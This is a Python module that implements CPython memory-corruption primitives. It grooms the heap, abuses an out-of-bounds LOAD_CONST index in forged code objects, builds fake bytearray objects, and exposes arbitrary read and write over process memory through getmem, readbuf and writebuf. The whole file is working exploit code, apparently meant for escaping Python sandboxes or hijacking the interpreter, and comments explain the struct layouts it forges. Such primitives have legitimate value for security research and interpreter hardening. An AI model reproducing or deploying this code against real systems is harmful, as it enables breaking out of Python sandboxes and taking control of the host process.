from types import CodeType, FunctionType
from etc import addrof, bytes
from pack import p64a, unpack
from ref import refbytes
from constants import nogc

__all__ = [
    "readbuf",
    "writebuf",
    "readuint",
    "writeuint",
    "get_aligned_tuple_and_bytes",
    "load_n",
    "replace_code_consts",
    "fakeobj_once",
    "fakeobj",
    "getmem",
]

INT64_MAX = (1 << 63) - 1
INT32_MAX = (1 << 31) - 1
INT32_MIN = -(1 << 31)

TUPLE_HEADER_LEN = type(tuple()).__sizeof__(tuple())

mem = None  # cache the result
reusable_tuple = (None,)
reusable_bytearray = None


def readbuf(addr, length):
    return mem[addr - 0x1000 : addr - 0x1000 + length]


def writebuf(addr, data):
    mem[addr - 0x1000 : addr - 0x1000 + len(data)] = data


def readuint(addr, size):
    return unpack(readbuf(addr, size))


def writeuint(addr, n, size):
    data = p64a(n)[:size]
    writebuf(addr, data)


def get_aligned_tuple_and_bytes(prefix):
    its_per_size = 4
    tuples = []
    byteses = []  # the plural of bytes is byteses, obviously
    for size in range(8, 64)[::-1]:
        tupletemplate = range(size)
        suffix = b"\0" * (size * 8 - len(prefix))
        for _ in range(its_per_size):
            tuples.append(tuple(tupletemplate))
            byteses.append(prefix + suffix)

    bestdist = 99999999999
    besttuple = None
    bestbytes = None
    pairs = [(t, b) for t in tuples for b in byteses]
    for t, b in pairs:
        dist = addrof(b) - addrof(t)
        if dist > 0 and dist < bestdist:
            bestdist = dist
            besttuple = t
            bestbytes = b

    if bestdist > 100000:
        raise Exception(
            "Heap groom failed: Could not allocate bytes near enough to tuple",
            hex(bestdist),
        )

    return (besttuple, bestbytes)


# generate a function that effectively does LOAD_CONST(n)
def load_n(n):
    return eval(
        "lambda: list(%s) if None else %s" % (",".join(map(str, range(1, n))), n)
    )


def replace_code_consts(codeobj, consts):
    # py3.8+
    if hasattr(codeobj, "replace"):
        return codeobj.replace(co_consts=consts)

    code_args = []
    argnames = CodeType.__doc__.split("(")[1].split("[")[0].split(",")
    for argname in argnames:
        argname = argname.strip()

        if argname == "codestring":
            argname = "code"

        if argname == "constants":
            code_args.append(consts)
        else:
            code_args.append(getattr(codeobj, "co_" + argname))

    return CodeType(*code_args)


def fakeobj_once(addr):
    fake_bytearray_ptr = bytes(p64a(addr))

    # pad to 8-byte multiple
    fake_bytearray_ptr = b"\0\0\0\0" + fake_bytearray_ptr

    nogc.append(
        fake_bytearray_ptr
    )  # if this bytearray gets freed, bad things might happen

    const_tuple, fake_bytearray_ref = get_aligned_tuple_and_bytes(fake_bytearray_ptr)

    nogc.append(fake_bytearray_ref)  # likewise

    const_tuple_array_start = addrof(const_tuple) + TUPLE_HEADER_LEN
    fake_bytearray_ref_addr = refbytes(fake_bytearray_ref)

    fake_bytearray_ref_addr += 4
    offset = (fake_bytearray_ref_addr - const_tuple_array_start) // 8

    assert INT32_MIN <= offset <= INT32_MAX

    loader_code = load_n(offset).__code__
    newcode = replace_code_consts(loader_code, const_tuple)

    makemagic = FunctionType(newcode, {})

    magic = makemagic()
    return magic


def fakeobj(addr):
    """
    fakeobj_once() does a heap spray each time, which may fail probabilistically and/or OOM.
    so, we use it once to set up a more repeatable fakeobj primitive which we can
    cache and reuse for future fakeobj() invocations.

    reusable_bytearray is a fake bytearray that points into the first entry of
    reusable_tuple, allowing us to freely modify the object it points to.
    """

    global reusable_bytearray
    if reusable_bytearray is None:
        # py3: https://github.com/python/cpython/blob/75c551974f74f7656fbb479b278e69c8200b4603/Include/cpython/bytearrayobject.h#L5-L12
        """
        typedef struct _object PyObject;

        # real definition has lots of #ifdefs, but it's basically this
        struct _object {
            Py_ssize_t ob_refcnt;
            PyTypeObject *ob_type;
        }

        #define PyObject_VAR_HEAD      PyVarObject ob_base;

        typedef struct {
            PyObject ob_base;
            Py_ssize_t ob_size; /* Number of items in variable part */
        } PyVarObject;

        typedef struct {
            PyObject_VAR_HEAD
            Py_ssize_t ob_alloc;   /* How many bytes allocated in ob_bytes */
            char *ob_bytes;        /* Physical backing buffer */
            char *ob_start;        /* Logical start inside ob_bytes */
            Py_ssize_t ob_exports; /* How many buffer exports */
        } PyByteArrayObject;
        """
        # py2: https://github.com/certik/python-2.7/blob/c360290c3c9e55fbd79d6ceacdfc7cd4f393c1eb/Include/bytearrayobject.h#L22-L28
        """
        typedef struct {
            PyObject_VAR_HEAD
            /* XXX(nnorwitz): should ob_exports be Py_ssize_t? */
            int ob_exports; /* how many buffer exports */
            Py_ssize_t ob_alloc; /* How many bytes allocated */
            char *ob_bytes;
        } PyByteArrayObject;
        """
        fake_bytearray = bytes(
            p64a(
                1,  # ob_refcnt
                addrof(bytearray),  # ob_type
                8,  #    ob_size
                0,  #    py2 ob_exports, py3 ob_alloc
                8 + 1,  #    py2 ob_alloc, py3 ob_bytes
                addrof(reusable_tuple) + TUPLE_HEADER_LEN,  # py2 ob_bytes, py3 ob_start
                0,  # py3 ob_exports
            )
        )
        nogc.append(fake_bytearray)  # important!!!
        reusable_bytearray = fakeobj_once(refbytes(fake_bytearray))

    # assume 64-bit ptrs
    backup = reusable_bytearray[:8]
    reusable_bytearray[:8] = p64a(addr)
    res = reusable_tuple[0]
    reusable_bytearray[:8] = backup

    nogc.append(res)  # unnecessary?
    return res


def getmem():
    global mem
    if mem:
        return mem

    fake_bytearray = bytes(
        p64a(1, addrof(bytearray), INT64_MAX - 0x1000, 0, 0, 0x1000, 0)
    )
    nogc.append(fake_bytearray)

    mem = fakeobj(refbytes(fake_bytearray))
    return mem
